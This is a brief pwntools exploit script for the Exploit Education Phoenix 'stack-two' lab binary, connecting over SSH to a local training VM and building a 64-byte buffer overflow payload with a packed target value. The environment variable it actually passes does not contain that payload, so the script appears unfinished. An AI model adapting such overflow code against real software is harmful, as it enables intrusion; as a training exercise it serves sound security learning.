from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 0x40 + p64(0x0d0a090a)
print(s)
s = s.decode()
print(s)
sh = shell.run(b"/opt/phoenix/amd64/stack-two", env={"ExploitEducation": b"a\x00\x00"})
print(sh.recvlines(2))
